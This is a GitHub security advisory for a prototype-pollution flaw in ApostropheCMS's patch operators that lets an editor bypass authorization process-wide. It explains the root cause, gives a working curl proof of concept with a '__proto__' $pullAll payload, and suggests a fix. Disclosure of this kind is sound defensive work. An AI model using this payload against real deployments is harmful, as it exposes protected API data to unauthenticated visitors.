# [C] Apostrophe has Server-Side Prototype Pollution in apos.util.set via patch operators that leads to process-wide authorization bypass

## Summary
Severity: Critical
Advisory: GHSA-6h5j-32cf-4253
CVE: CVE-2026-53609
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-6h5j-32cf-4253
Type: github-advisory

## Affected
- npm: `apostrophe` — affected >=0 <4.31.0

## Details
<img width="1919" height="1046" alt="proto" src="https://github.com/user-attachments/assets/c5c69718-6448-448d-b64b-e3db41ab6ff6" />

## Summary

`apos.util.set()` traverses dot-notation paths without sanitizing `__proto__`, allowing an authenticated editor to write arbitrary values to `Object.prototype` via the `$pullAll` patch operator.

A confirmed gadget in `publicApiCheck()` causes this to bypass authorization on all piece-type REST API endpoints for every subsequent unauthenticated request, for the lifetime of the Node.js process.

---

## Details

### Root Cause — `apos.util.set()` (`modules/@apostrophecms/util/index.js` ~line 800)

The function splits a dot-notation path and traverses properties without rejecting `__proto__`, `constructor`, or `prototype`:

```js
set(o, path, v) {
  path = path.split('.');
  for (i = 0; i < path.length - 1; i++) {
    o = o[path[i]];   // when path[i] === '__proto__', o becomes Object.prototype
  }
  o[path[i]] = v;     // mutates Object.prototype
}
```

### Source — `implementPatchOperators()` (`modules/@apostrophecms/schema/index.js` ~line 1737)

User-controlled keys from the `$pullAll` operator are passed directly to `apos.util.set()`:

```js
_.each(patch.$pullAll, function(val, key) {
  cloneOriginalBase(key);               // uses _.has (hasOwnProperty)
  self.apos.util.set(patch, key, ...);  // key is fully attacker-controlled
});
```

`cloneOriginalBase()` does not sanitize `__proto__` because `_.has()` performs an own-property check. Since `__proto__` is inherited rather than an own property, the clone step is skipped and execution falls through to `apos.util.set()`.

The same unsanitized call also appears for direct dot-notation keys in the PATCH body (~line 1811), providing a second independent entry point.

---

### Gadget — `publicApiCheck()` (`modules/@apostrophecms/piece-type/index.js` ~line 1148)

```js
publicApiCheck(req) {
  if (!self.options.publicApiProjection) {
    if (!self.canAccessApi(req)) {
      throw self.apos.error('notfound');
    }
  }
}
```

Once `Object.prototype.publicApiProjection` is set to any truthy value (for example `[]`), every module instance inherits it.

Because JavaScript property lookup resolves inherited properties from `Object.prototype`, the condition:

```js
!self.options.publicApiProjection
```

evaluates to `false` for all modules.

As a result, the authorization check is skipped for every subsequent request handled by the process.

---

## Proof of Concept

**Environment:** ApostropheCMS v4.30.0, Node.js, MongoDB

**Prerequisites:** Editor-level credentials

### Step 1 — Confirm Endpoint Is Protected (Unauthenticated)

```bash
curl -s http://localhost:3000/api/v1/@apostrophecms/user
```

Response:

```json
{"name":"notfound","data":{},"message":"notfound"}
```

---

### Step 2 — Obtain Editor Token

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/v1/@apostrophecms/login/login \
  -H "Content-Type: application/json" \
  -d '{"username":"editor","password":"..."}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

---

### Step 3 — Poison `Object.prototype` via `$pullAll`

```bash
curl -X PATCH "http://localhost:3000/api/v1/@apostrophecms/global/{docId}:en:draft" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Cookie: apos-testapp.csrf=csrf" \
  -H "X-XSRF-TOKEN: csrf" \
  -d '{"$pullAll":{"__proto__.publicApiProjection":[]}}'
```

Response:

```http
HTTP/1.1 200 OK
```

---

### Step 4 — Authorization Bypass Confirmed (Unauthenticated)

```bash
curl -s http://localhost:3000/api/v1/@apostrophecms/user
```

Response:

```json
{"pages":0,"currentPage":1,"results":[]}
```

The endpoint now returns a valid paginated response instead of `notfound`.

No credentials are supplied.

Execution passes `publicApiCheck()` and reaches query processing. The empty result set reflects document-level visibility filtering; the authorization gate itself has been bypassed.

### Cleanup

The pollution persists until the Node.js process is restarted.

---

## Impact

### Vulnerability Type

**Server-Side Prototype Pollution leading to Authorization Bypass** (CWE-1321)

### Who Is Impacted

Any ApostropheCMS installation where at least one editor-level account exists.

This is the default configuration for multi-user CMS deployments.

### Security Impact

A single PATCH request from an editor permanently modifies authorization behavior for the entire Node.js process.

All subsequent unauthenticated requests to piece-type REST API endpoints bypass `publicApiCheck()`.

Verified affected endpoints include:

- `@apostrophecms/user`
- `@apostrophecms/global`

Based on the shared authorization implementation, other piece-type REST endpoints appear similarly affected.

The bypass affects every unauthenticated visitor until the server is restarted.

---

## Suggested Fix

Reject dangerous prototype-related path segments before traversal:

```js
if (
  p === '__proto__' ||
  p === 'constructor' ||
  p === 'prototype'
) {
  return;
}
```

Apply the same validation both:

1. Inside `apos.util.set()`
2. Before passing user-controlled keys into `apos.util.set()` from `implementPatchOperators()`

---

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-6h5j-32cf-4253
- https://nvd.nist.gov/vuln/detail/CVE-2026-53609
- https://github.com/apostrophecms/apostrophe/pull/5464
- https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b
- https://github.com/apostrophecms/apostrophe
